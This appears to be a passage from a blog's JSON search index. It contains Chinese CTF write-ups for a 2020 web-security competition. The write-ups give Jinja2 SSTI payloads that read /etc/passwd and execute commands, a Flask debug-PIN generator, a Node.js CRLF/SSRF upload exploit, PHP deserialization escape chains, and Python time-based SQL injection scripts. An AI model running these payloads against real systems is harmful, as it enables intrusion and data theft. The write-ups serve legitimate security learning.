https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://glotozz.github.io/tags/SSTI/"}]},{"title":"2020新春战疫-网络安全公益赛-3","slug":"2020新春战疫-网络安全公益赛-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T10:45:48.427Z","comments":true,"path":"2020/02/23/2020新春战疫-网络安全公益赛-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Flaskapp node_game ezExpress easy_thinking Flaskapphint中提示PIN，那么估计利用debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debug得到源码 读取配置利用自带的/encode，然后传入/decode 1&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days&#x3D;31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds&#x3D;43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None&#125;&gt; 还是得生成PIN，需要读取一些配置文件 https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload 文件读取 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; 命令执行 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125; 都被waf 查看网卡 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125; 得到02:42:ac:12:00:02=&gt;2485377957890 在docker中，查看机器码 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&#39;ls &#x2F;&#39;).read() 翔哥的方法：直接绕waf命令执行 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125; 没有回显，反弹shell即可 node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload 本地测一下 123456#使用npm 安装一个模块 n 到全局npm install -g n#使用 n 加版本号就可以安装其他版本n 8.12.0#再使用 n ，通过上下键，就可以选择不同的版本n wireshark里面是这样的 也就是说payload有问题，并没有实现CRLF注入，但是不知道哪有问题。。 Express文件上传，查看参数内容，等下构造包的时候方便些 123var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;var file_name &#x3D; req.files[0].originalnamevar dir_file &#x3D; __dirname + file_path + file_name 作罢 ======================分割线 赵师傅发了脚本，CRLF的编码和wp不太一样 原理： https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入chr(0xffa0)处理后会被截断为chr(0xa0)，并且这个0xff可更换 测试CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) 但是打题目和本地还是失败，依旧是304，我丢，再用脚本发包发现可以，猜测原因可能是bp发送GET请求中有这些非可见字符的时候可能会出错 返回200，返回源码 既然CSRF注入成功，配合SSRF上传文件 之前看源码发现我们可控文件路径，但是还需要访问 123456789app.get(&#39;&#x2F;&#39;, function(req, res) &#123; var action &#x3D; req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;); var html &#x3D; pug.renderFile(file); res.send(html);&#125;); 上传a.pug到/template下即可 pug语法： https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt 修改源码把ip限制去掉抓包 123456789101112131415161718POST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827-- 结合CRLF 123456789101112131415161718192021222324252627payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827--GET &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39; 最后访问 这里发包格式还是挺细的，可以通过wireshark分析排查，比如一开始我出现过下面的解析错误 ezExpress明显的JavaScript原型链污染 留下了不学无术的眼泪.jpg =================分割线 JavaScript原型链污染： https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinking应该是tp框架，提示Vulnerability Search，可能是搜索功能有问题 产生报错 tp6.0，应该会给源码，扫了下，发现www.zip https://paper.seebug.org/1114/ 猜测是搜索记录是data，sessionid是文件名，想本地测试下，发现运行报错 [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 对照tp6文件，先将index.php移到public中，再修改 require __DIR__ . &#39;/../vendor/autoload.php&#39;; 又报错 模板文件不存在:public/static/tamplate/index\\index.html 但是明明路径没错，查看配置 config/view.php修改view_dir_name为public 修改app/home/config/view.php为static/tamplate/ 总算能用了。。 在登录的时候设置session的时候修改sessionid，在查询的时候用这个sessionid即可添加任意内容 但是这样访问不到，需要写入app/home/controller/a.php下， 构造../../../../app/home/controller/a.php 长度37 也没有文件包含的地方。。遂作罢 正解就是题目环境直接访问就行。。 因为我本地修改了一些配置导致无法访问。。但是不改调试不了。。 最后还需要bypassdisable_func，需要执行/readflag 这个做过几次，过滤了很多，包括mail()等 https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-2","slug":"2020新春战疫-网络安全公益赛-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-27T10:48:03.663Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 easysqli_copy blacklist Ezsqli 放上我xxxxx easysqli_copy看到PDO+set names gbk 就想到宽字节注入，之前看过的文章 从宽字节注入认识PDO的原理和正确使用：https://www.freebuf.com/articles/web/216336.html 简单测试了下，发现可以，但是过滤了select，我简单测试了下发现存在堆叠注入，没有过滤=，万事大吉 1234select hex(&#39;select sleep(5)&#39;);set @a&#x3D;0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id&#x3D;1%df&#39;;set%20@a&#x3D;0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; 脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); emm，这个黑名单似乎可以用昨天的exp打。。。 1inject&#x3D;1&#39;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 需要先利用堆叠注入查询表和字段 11&#39;;show tables;# 得到FlagHere 11&#39;; show columns from &#96;FlagHere&#96;; # 得到flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 还有个问题，就是利用昨天的方法只能查当前表，而flag在另一张表中。 遂作罢 https://www.4hou.com/posts/mM60 骚操作：handler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&#39;;handler FlagHere open as a;handler a READ first;# 得到flag Ezsqlibp跑一下sql字典 不是200就是500,500的是语法错误，其实过滤字符的并不多 数字型，有回显考虑盲注，简单构造了下成了 bp跑一下发现c的时候Hello Nu1L 数据库为ctf,mysql版本为5.7.1 发现innodb也被过滤。。 聊一聊bypass information_schema：https://www.anquanke.com/post/id/193512 前提要是mysql ≥ 5.7版本 新特性sys.schema_auto_increment_columns也被过滤。。 1select table_name from sys.schema_auto_increment_columns where table_schema&#x3D;&#39;ctf&#39; 还有另一种 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer 成功得到了表名users233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh 报500错误，说明不止1列。。。猜了几个字段也不行==！无列名注入实在搞不出来。。 正解 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) 有个缺陷，就是不区分大小写。。 https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg 预期解是文章中提到的使用 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 来另其返回二进制字符串，从而区分大小写。 测试了一下 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 需要mysql&gt;=5.7 对于sys.x$schema_table_statistics_with_buffer是视图，所以一开始本地没找到==！ 视图是在基本表之上建立的表，它的结构（即所定义的列）和内容（即所有记录）都来自基本表，它依据基本表存在而存在。一个视图可以对应一个基本表，也可以对应多个基本表。视图是基本表的抽象和在逻辑意义上建立的新关系。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-1","slug":"2020新春战疫-网络安全公益赛-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-27T10:46:57.992Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-1/","excerpt":"最近做啥都没耐心==！","text":"最近做啥都没耐心==！ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 盲注 第一种，不用select（只能查当前表） 第二种，利用堆叠注入，16进制+mysql预处理 babyphp 参考链接: 盲注给了源码，简单测一下过滤内容 select被过滤！！以及= like等，可用regexp 没有回显考虑时间盲注。select被过滤，我通常两种办法， 第一种，不用select（只能查当前表）11 and if(1,sleep(5),1) 成功延时 121 and if(database() regexp(&#39;^&#39;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) 一开始不知道为啥跑到flag{就断了，索性加个hex()，就好了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) 第二种，利用堆叠注入，16进制+mysql预处理 堆叠注入： https://www.jianshu.com/p/36f0772f5ce8 先判断能否堆叠注入，既然不能用select，用show代替 11;show tables;# 发现没有报500，应该可以堆叠注入 3种payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 1SET @sql&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 但是我本地测试时只有第二个能执行，而第二个恰恰使用了= 猜测是版本问题，先去看了原题 简单来说，MariaDB是MySQL源代码的一个分支 , MariaDB包括的一些新特性使它优于MySQL。 MariaDB跟MySQL在绝大多数方面是兼容的，对于开发者来说，几乎感觉不到任何不同。 然后我把本地mysql版本切到mysql8.0.12，已选择执行是正常的，整个执行还是一样不行 想直接在题目上打一打试试，发现环境已经关了，遂作罢 babyphpwww.zip源码泄露，代码审计，思路很明确， 1234if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; 需要成功登录admin， 寻找反序列化入口， 123456789101112public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑&#125;public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname)));&#125; 正常情况下这里的反序列化我们只能控制Info类的两个属性，但是这里通过safe()方法可以逃逸字符，甚至还可以逃逸对象 思路一、 User-&gt;__destruct()读取flag.php 但是很快就发现行不通。首先是return，不会打印出来，其次flag被过滤替换成hacker 思路二、 注出admin密码登陆后查看 UpdateHelper类-&gt;__destruct() User类-&gt;toString() Info类-&gt;__call() dbCtrl类-&gt;login() 构造一个正常的payload，比如POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 测试逃逸，比如逃逸出$CtrlCase的值为haha， 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; 需要逃逸29个字符，&#39;-&gt;hacker逃逸5个字符,构造5个单引号和4个union POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} 下面是序列化内容 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 再举个逃逸对象的例子 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63个逃逸字符-12个单引号和3个union，这里要注意的是题目中flag也被替换成hacker 在构造前分析下sql 123456789$result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult;&#125; 返回结果集中的$idResult，查询的时候把第一个参数改为password即可 1select password,id from user where username&#x3D;? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; 得到 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125; 满足格式 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; 365位，73个单引号 1age&#x3D;&amp;nickname&#x3D;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; md5解密登录即可 参考链接: http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"New Start","slug":"start","date":"2020-02-20T11:17:40.000Z","updated":"2020-02-20T11:59:16.262Z","comments":true,"path":"2020/02/20/start/","link":"","permalink":"https://glotozz.github.io/2020/02/20/start/","excerpt":"","text":"。即是终点也是起点","categories":[],"tags":[]}]}